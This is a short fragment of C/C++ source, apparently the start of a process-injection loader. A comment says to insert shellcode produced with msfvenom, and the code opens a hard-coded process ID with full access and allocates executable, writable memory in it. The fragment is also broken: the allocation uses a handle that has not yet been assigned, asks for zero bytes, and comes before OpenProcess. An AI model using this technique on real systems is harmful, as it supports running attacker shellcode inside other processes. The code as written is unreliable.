...
// Shell code above you will eddit to your own from msf venom 

    HANDLE hprocess; //Handel to store the remote process handel
    HANDLE hthread; // Handel to remote thread
            void* exec_mem = VirtualAllocEx(hprocess, NULL,0 ,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
   hprocess = OpenProcess(PROCESS_ALL_ACCESS, TRUE,2828);
